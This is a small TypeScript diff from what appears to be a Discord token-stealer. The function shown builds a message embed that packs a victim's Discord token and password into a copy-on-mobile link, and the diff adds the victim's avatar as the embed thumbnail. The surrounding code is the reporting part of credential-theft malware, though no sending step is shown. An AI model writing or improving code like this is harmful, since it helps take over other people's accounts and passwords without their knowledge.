@@ -19,6 +19,7 @@ export async function getUserEmailChangeEmbed(config: ConfigFSBinder, account = 
     const token = account.discord.token;
     const des= `[**${PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${COPY_ON_MOBILE}${token}<br>${password})`;
     embed.setDescription(des);
+    embed.setThumbnail(await account.discord.getAvatar());
 
     embed.setFields([{
         name: "Info",
